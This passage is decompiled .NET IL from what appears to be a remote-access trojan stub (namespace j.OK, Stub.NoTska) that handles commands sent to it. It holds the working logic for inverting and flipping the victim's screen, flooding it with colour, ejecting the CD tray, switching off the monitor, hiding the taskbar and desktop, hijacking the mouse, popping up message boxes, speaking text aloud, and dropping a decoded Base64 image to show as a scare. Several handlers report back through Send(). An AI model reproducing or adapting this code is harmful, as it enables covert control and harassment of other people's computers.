        IL_07e7:  call       bool j.OK::Send(string)
        IL_07ec:  pop
        IL_07ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_07f2:  leave      IL_0f2b

      }  // end handler
      IL_07f7:  call       native int j.OK::GetDesktopWindow()
      IL_07fc:  call       native int j.OK::GetWindowDC(native int)
      IL_0801:  stloc.s    V_12
      IL_0803:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0808:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_080d:  stloc.s    V_15
      IL_080f:  ldloca.s   V_15
      IL_0811:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0816:  stloc.s    V_13
      IL_0818:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_081d:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0822:  stloc.s    V_15
      IL_0824:  ldloca.s   V_15
      IL_0826:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_082b:  stloc.s    V_14
      IL_082d:  ldloc.s    V_12
      IL_082f:  ldc.i4.0
      IL_0830:  ldloc.s    V_14
      IL_0832:  ldloc.s    V_13
      IL_0834:  ldc.i4.0
      IL_0835:  ldloc.s    V_14
      IL_0837:  sub.ovf
      IL_0838:  ldloc.s    V_12
      IL_083a:  ldc.i4.0
      IL_083b:  ldc.i4.0
      IL_083c:  ldloc.s    V_13
      IL_083e:  ldloc.s    V_14
      IL_0840:  ldc.i4     0xcc0020
      IL_0845:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_084a:  pop
      IL_084b:  br         IL_0f2b

      IL_0850:  call       native int j.OK::GetDesktopWindow()
      IL_0855:  call       native int j.OK::GetWindowDC(native int)
      IL_085a:  stloc.s    V_16
      IL_085c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0861:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0866:  stloc.s    V_15
      IL_0868:  ldloca.s   V_15
      IL_086a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_086f:  stloc.s    V_17
      IL_0871:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0876:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_087b:  stloc.s    V_15
      IL_087d:  ldloca.s   V_15
      IL_087f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0884:  stloc.s    V_18
      IL_0886:  ldloc.s    V_16
      IL_0888:  ldloc.s    V_17
      IL_088a:  ldc.i4.0
      IL_088b:  ldc.i4.0
      IL_088c:  ldloc.s    V_17
      IL_088e:  sub.ovf
      IL_088f:  ldloc.s    V_18
      IL_0891:  ldloc.s    V_16
      IL_0893:  ldc.i4.0
      IL_0894:  ldc.i4.0
      IL_0895:  ldloc.s    V_17
      IL_0897:  ldloc.s    V_18
      IL_0899:  ldc.i4     0xcc0020
      IL_089e:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_08a3:  pop
      IL_08a4:  br         IL_0f2b

      IL_08a9:  call       native int j.OK::GetDesktopWindow()
      IL_08ae:  call       native int j.OK::GetWindowDC(native int)
      IL_08b3:  stloc.s    V_19
      IL_08b5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08ba:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08bf:  stloc.s    V_15
      IL_08c1:  ldloca.s   V_15
      IL_08c3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_08c8:  stloc.s    V_20
      IL_08ca:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08cf:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08d4:  stloc.s    V_15
      IL_08d6:  ldloca.s   V_15
      IL_08d8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_08dd:  stloc.s    V_21
      IL_08df:  ldloc.s    V_19
      IL_08e1:  ldc.i4.0
      IL_08e2:  ldc.i4.0
      IL_08e3:  ldloc.s    V_20
      IL_08e5:  ldloc.s    V_21
      IL_08e7:  ldloc.s    V_19
      IL_08e9:  ldc.i4.0
      IL_08ea:  ldc.i4.0
      IL_08eb:  ldloc.s    V_20
      IL_08ed:  ldloc.s    V_21
      IL_08ef:  ldc.i4     0x330008
      IL_08f4:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_08f9:  pop
      IL_08fa:  br         IL_0f2b

      IL_08ff:  call       native int j.OK::GetDesktopWindow()
      IL_0904:  call       native int j.OK::GetWindowDC(native int)
      IL_0909:  stloc.s    V_22
      IL_090b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0910:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0915:  stloc.s    V_15
      IL_0917:  ldloca.s   V_15
      IL_0919:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_091e:  stloc.s    V_23
      IL_0920:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0925:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_092a:  stloc.s    V_15
      IL_092c:  ldloca.s   V_15
      IL_092e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0933:  stloc.s    V_24
      IL_0935:  ldloc.s    V_22
      IL_0937:  ldc.i4.0
      IL_0938:  ldc.i4.0
      IL_0939:  ldloc.s    V_23
      IL_093b:  ldloc.s    V_24
      IL_093d:  ldloc.s    V_22
      IL_093f:  ldc.i4.0
      IL_0940:  ldc.i4.0
      IL_0941:  ldloc.s    V_23
      IL_0943:  ldloc.s    V_24
      IL_0945:  ldc.i4     0xff0062
      IL_094a:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_094f:  pop
      IL_0950:  br         IL_0f2b

      IL_0955:  call       native int j.OK::GetDesktopWindow()
      IL_095a:  call       native int j.OK::GetWindowDC(native int)
      IL_095f:  stloc.s    V_25
      IL_0961:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0966:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_096b:  stloc.s    V_15
      IL_096d:  ldloca.s   V_15
      IL_096f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0974:  stloc.s    V_26
      IL_0976:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_097b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0980:  stloc.s    V_15
      IL_0982:  ldloca.s   V_15
      IL_0984:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0989:  stloc.s    V_27
      IL_098b:  ldloc.s    V_25
      IL_098d:  ldc.i4.0
      IL_098e:  ldc.i4.0
      IL_098f:  ldloc.s    V_26
      IL_0991:  ldloc.s    V_27
      IL_0993:  ldloc.s    V_25
      IL_0995:  ldc.i4.0
      IL_0996:  ldc.i4.0
      IL_0997:  ldloc.s    V_26
      IL_0999:  ldloc.s    V_27
      IL_099b:  ldc.i4.s   66
      IL_099d:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_09a2:  pop
      IL_09a3:  br         IL_0f2b

      IL_09a8:  call       native int j.OK::GetDesktopWindow()
      IL_09ad:  call       native int j.OK::GetWindowDC(native int)
      IL_09b2:  stloc.s    V_28
      IL_09b4:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_09b9:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_09be:  stloc.s    V_15
      IL_09c0:  ldloca.s   V_15
      IL_09c2:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_09c7:  stloc.s    V_29
      IL_09c9:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_09ce:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_09d3:  stloc.s    V_15
      IL_09d5:  ldloca.s   V_15
      IL_09d7:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_09dc:  stloc.s    V_30
      IL_09de:  ldloc.s    V_28
      IL_09e0:  ldc.i4.s   25
      IL_09e2:  ldc.i4.s   25
      IL_09e4:  ldloc.s    V_29
      IL_09e6:  ldc.i4.s   50
      IL_09e8:  sub.ovf
      IL_09e9:  ldloc.s    V_30
      IL_09eb:  ldc.i4.s   50
      IL_09ed:  sub.ovf
      IL_09ee:  ldloc.s    V_28
      IL_09f0:  ldc.i4.0
      IL_09f1:  ldc.i4.0
      IL_09f2:  ldloc.s    V_29
      IL_09f4:  ldloc.s    V_30
      IL_09f6:  ldc.i4     0xcc0020
      IL_09fb:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0a00:  pop
      IL_0a01:  br         IL_0f2b

      IL_0a06:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0a0b:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_0a10:  stloc.s    V_31
      IL_0a12:  ldloca.s   V_31
      IL_0a14:  constrained. [mscorlib]System.Guid
      IL_0a1a:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0a1f:  ldstr      "-"
      IL_0a24:  ldstr      ""
      IL_0a29:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0a2e:  ldstr      ".exe"
      IL_0a33:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a38:  pop
      IL_0a39:  ldstr      "on"
      IL_0a3e:  stsfld     string j.OK::NTTA
      IL_0a43:  call       void Stub.NoTska::Start()
      IL_0a48:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0a4d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0a52:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0a57:  ldstr      "select.dat"
      IL_0a5c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0a61:  ldc.i4.1
      IL_0a62:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                       bool)
      IL_0a67:  dup
      IL_0a68:  ldstr      "002"
      IL_0a6d:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0a72:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      .try
      {
        IL_0a77:  newobj     instance void Form1::.ctor()
        IL_0a7c:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_0a81:  leave      IL_0f2b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a86:  dup
        IL_0a87:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a8c:  stloc.s    V_32
        IL_0a8e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a93:  leave      IL_0f2b

      }  // end handler
      IL_0a98:  ldstr      "Love"
      IL_0a9d:  stsfld     string j.OK::NTTA
      .try
      {
        IL_0aa2:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0aa7:  ldstr      "select.dat"
        IL_0aac:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0ab1:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_0ab6:  brfalse.s  IL_0acc

        IL_0ab8:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0abd:  ldstr      "select.dat"
        IL_0ac2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0ac7:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0acc:  leave      IL_0f2b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ad1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ad6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0adb:  leave      IL_0f2b

      }  // end handler
      IL_0ae0:  call       native int j.OK::GetDesktopWindow()
      IL_0ae5:  call       native int j.OK::GetWindowDC(native int)
      IL_0aea:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0aef:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0af4:  stloc.s    V_15
      IL_0af6:  ldloca.s   V_15
      IL_0af8:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0afd:  stloc.s    V_33
      IL_0aff:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0b04:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0b09:  stloc.s    V_15
      IL_0b0b:  ldloca.s   V_15
      IL_0b0d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0b12:  stloc.s    V_34
      IL_0b14:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0b19:  ldc.i4.0
      IL_0b1a:  ldc.i4     0x1000000
      IL_0b1f:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_0b24:  conv.ovf.u4
      IL_0b25:  call       native int j.OK::CreateSolidBrush(uint32)
      IL_0b2a:  stloc.s    V_35
      IL_0b2c:  dup
      IL_0b2d:  ldloc.s    V_35
      IL_0b2f:  call       native int j.OK::SelectObject(native int,
                                                         native int)
      IL_0b34:  pop
      IL_0b35:  ldc.i4.0
      IL_0b36:  ldc.i4.0
      IL_0b37:  ldloc.s    V_33
      IL_0b39:  ldloc.s    V_34
      IL_0b3b:  ldc.i4     0x5a0049
      IL_0b40:  call       bool j.OK::PatBlt(native int,
                                             int32,
                                             int32,
                                             int32,
                                             int32,
                                             valuetype j.OK/TernaryRasterOperations)
      IL_0b45:  pop
      IL_0b46:  ldloc.s    V_35
      IL_0b48:  call       bool j.OK::DeleteObject(native int)
      IL_0b4d:  pop
      IL_0b4e:  br         IL_0f2b

      IL_0b53:  ldnull
      IL_0b54:  ldftn      void j.OK::Mouse()
      IL_0b5a:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0b5f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_0b64:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0b69:  br         IL_0f2b

      IL_0b6e:  ldstr      "set CDAudio door open"
      IL_0b73:  ldnull
      IL_0b74:  ldc.i4.0
      IL_0b75:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b7a:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_0b7f:  pop
      IL_0b80:  br         IL_0f2b

      IL_0b85:  ldstr      "set CDAudio door closed"
      IL_0b8a:  ldnull
      IL_0b8b:  ldc.i4.0
      IL_0b8c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b91:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_0b96:  pop
      IL_0b97:  br         IL_0f2b

      IL_0b9c:  ldc.i4.m1
      IL_0b9d:  ldc.i4     0x112
      IL_0ba2:  ldc.i4     0xf170
      IL_0ba7:  ldc.i4.m1
      IL_0ba8:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0bad:  br         IL_0f2b

      IL_0bb2:  ldc.i4.m1
      IL_0bb3:  ldc.i4     0x112
      IL_0bb8:  ldc.i4     0xf170
      IL_0bbd:  ldc.i4.2
      IL_0bbe:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0bc3:  br         IL_0f2b

      IL_0bc8:  ldstr      "Shell_TrayWnd"
      IL_0bcd:  ldnull
      IL_0bce:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0bd3:  ldc.i4.0
      IL_0bd4:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0bd9:  pop
      IL_0bda:  leave      IL_1ae9

      IL_0bdf:  ldstr      "Shell_TrayWnd"
      IL_0be4:  ldnull
      IL_0be5:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0bea:  ldc.i4.4
      IL_0beb:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0bf0:  pop
      IL_0bf1:  leave      IL_1ae9

      IL_0bf6:  ldstr      "Progman"
      IL_0bfb:  ldnull
      IL_0bfc:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0c01:  ldc.i4.0
      IL_0c02:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0c07:  pop
      IL_0c08:  leave      IL_1ae9

      IL_0c0d:  ldstr      "Progman"
      IL_0c12:  ldnull
      IL_0c13:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0c18:  ldc.i4.4
      IL_0c19:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0c1e:  pop
      IL_0c1f:  leave      IL_1ae9

      IL_0c24:  ldstr      "ChamaFrmTerrorrr"
      IL_0c29:  call       bool j.OK::Send(string)
      IL_0c2e:  pop
      IL_0c2f:  br         IL_0f2b

      IL_0c34:  nop
      .try
      {
        IL_0c35:  ldnull
        IL_0c36:  stloc.s    V_36
        IL_0c38:  ldloc.3
        IL_0c39:  ldc.i4.2
        IL_0c3a:  ldelem.ref
        IL_0c3b:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_0c40:  ldc.i4.0
        IL_0c41:  stloc.s    V_38
        IL_0c43:  ldloca.s   V_38
        IL_0c45:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_0c4a:  stloc.s    V_36
        IL_0c4c:  ldstr      "temp"
        IL_0c51:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_0c56:  ldstr      "\\"
        IL_0c5b:  ldc.i4.s   10
        IL_0c5d:  call       string j.OK::RN(int32)
        IL_0c62:  ldloc.3
        IL_0c63:  ldc.i4.1
        IL_0c64:  ldelem.ref
        IL_0c65:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0c6a:  stloc.s    V_37
        IL_0c6c:  ldloc.s    V_37
        IL_0c6e:  ldloc.s    V_36
        IL_0c70:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0c75:  newobj     instance void frmSustos::.ctor()
        IL_0c7a:  dup
        IL_0c7b:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
        IL_0c80:  ldloc.s    V_37
        IL_0c82:  call       class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::FromFile(string)
        IL_0c87:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_Image(class [System.Drawing]System.Drawing.Image)
        IL_0c8c:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_0c91:  leave.s    IL_0ca2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c93:  dup
        IL_0c94:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c99:  stloc.s    V_39
        IL_0c9b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ca0:  leave.s    IL_0ca2

      }  // end handler
      IL_0ca2:  leave      IL_1ae9

      IL_0ca7:  ldc.i4.0
      IL_0ca8:  stloc.s    V_40
      IL_0caa:  ldc.i4.0
      IL_0cab:  stloc.s    V_41
      IL_0cad:  ldloc.0
      IL_0cae:  ldc.i4.1
      IL_0caf:  ldelem.ref
      IL_0cb0:  stloc.s    V_42
      IL_0cb2:  ldloc.s    V_42
      IL_0cb4:  ldstr      "Error"
      IL_0cb9:  ldc.i4.0
      IL_0cba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cbf:  brtrue.s   IL_0cc7

      IL_0cc1:  ldc.i4.s   64
      IL_0cc3:  stloc.s    V_41
      IL_0cc5:  br.s       IL_0d04

      IL_0cc7:  ldloc.s    V_42
      IL_0cc9:  ldstr      "Question"
      IL_0cce:  ldc.i4.0
      IL_0ccf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cd4:  brtrue.s   IL_0cdc

      IL_0cd6:  ldc.i4.s   32
      IL_0cd8:  stloc.s    V_41
      IL_0cda:  br.s       IL_0d04

      IL_0cdc:  ldloc.s    V_42
      IL_0cde:  ldstr      "Warning"
      IL_0ce3:  ldc.i4.0
      IL_0ce4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ce9:  brtrue.s   IL_0cf1

      IL_0ceb:  ldc.i4.s   48
      IL_0ced:  stloc.s    V_41
      IL_0cef:  br.s       IL_0d04

      IL_0cf1:  ldloc.s    V_42
      IL_0cf3:  ldstr      "Info"
      IL_0cf8:  ldc.i4.0
      IL_0cf9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cfe:  brtrue.s   IL_0d04

      IL_0d00:  ldc.i4.s   16
      IL_0d02:  stloc.s    V_41
      IL_0d04:  ldloc.0
      IL_0d05:  ldc.i4.2
      IL_0d06:  ldelem.ref
      IL_0d07:  stloc.s    V_43
      IL_0d09:  ldloc.s    V_43
      IL_0d0b:  ldstr      "YesNo"
      IL_0d10:  ldc.i4.0
      IL_0d11:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d16:  brtrue.s   IL_0d1d

      IL_0d18:  ldc.i4.4
      IL_0d19:  stloc.s    V_40
      IL_0d1b:  br.s       IL_0d7f

      IL_0d1d:  ldloc.s    V_43
      IL_0d1f:  ldstr      "YesNoCancel"
      IL_0d24:  ldc.i4.0
      IL_0d25:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d2a:  brtrue.s   IL_0d31

      IL_0d2c:  ldc.i4.3
      IL_0d2d:  stloc.s    V_40
      IL_0d2f:  br.s       IL_0d7f

      IL_0d31:  ldloc.s    V_43
      IL_0d33:  ldstr      "OK"
      IL_0d38:  ldc.i4.0
      IL_0d39:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d3e:  brtrue.s   IL_0d45

      IL_0d40:  ldc.i4.0
      IL_0d41:  stloc.s    V_40
      IL_0d43:  br.s       IL_0d7f

      IL_0d45:  ldloc.s    V_43
      IL_0d47:  ldstr      "OKCancel"
      IL_0d4c:  ldc.i4.0
      IL_0d4d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d52:  brtrue.s   IL_0d59

      IL_0d54:  ldc.i4.1
      IL_0d55:  stloc.s    V_40
      IL_0d57:  br.s       IL_0d7f

      IL_0d59:  ldloc.s    V_43
      IL_0d5b:  ldstr      "RetryCancel"
      IL_0d60:  ldc.i4.0
      IL_0d61:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d66:  brtrue.s   IL_0d6d

      IL_0d68:  ldc.i4.5
      IL_0d69:  stloc.s    V_40
      IL_0d6b:  br.s       IL_0d7f

      IL_0d6d:  ldloc.s    V_43
      IL_0d6f:  ldstr      "AbortRetryCancel"
      IL_0d74:  ldc.i4.0
      IL_0d75:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d7a:  brtrue.s   IL_0d7f

      IL_0d7c:  ldc.i4.2
      IL_0d7d:  stloc.s    V_40
      IL_0d7f:  ldloc.0
      IL_0d80:  ldc.i4.4
      IL_0d81:  ldelem.ref
      IL_0d82:  ldloc.0
      IL_0d83:  ldc.i4.3
      IL_0d84:  ldelem.ref
      IL_0d85:  ldloc.s    V_40
      IL_0d87:  ldloc.s    V_41
      IL_0d89:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_0d8e:  pop
      IL_0d8f:  leave      IL_1ae9

      IL_0d94:  ldstr      "SAPI.spvoice"
      IL_0d99:  ldstr      ""
      IL_0d9e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_0da3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0da8:  ldnull
      IL_0da9:  ldstr      "speak"
      IL_0dae:  ldc.i4.1
      IL_0daf:  newarr     [mscorlib]System.Object
      IL_0db4:  dup
      IL_0db5:  ldc.i4.0
      IL_0db6:  ldc.i4.1
      IL_0db7:  newarr     [mscorlib]System.String
      IL_0dbc:  dup
      IL_0dbd:  ldc.i4.0
      IL_0dbe:  ldloc.0
      IL_0dbf:  ldc.i4.1
      IL_0dc0:  ldelem.ref
      IL_0dc1:  stelem.ref
      IL_0dc2:  call       string [mscorlib]System.String::Concat(string[])
      IL_0dc7:  stelem.ref
      IL_0dc8:  ldnull
      IL_0dc9:  ldnull
      IL_0dca:  ldnull
      IL_0dcb:  ldc.i4.1
      IL_0dcc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0dd1:  pop
